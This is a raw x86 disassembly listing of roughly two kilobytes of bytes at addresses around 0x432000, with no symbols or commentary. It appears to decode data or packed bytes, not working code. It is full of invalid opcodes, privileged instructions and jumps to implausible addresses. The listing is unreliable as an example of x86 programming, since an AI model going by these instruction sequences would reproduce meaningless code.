  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
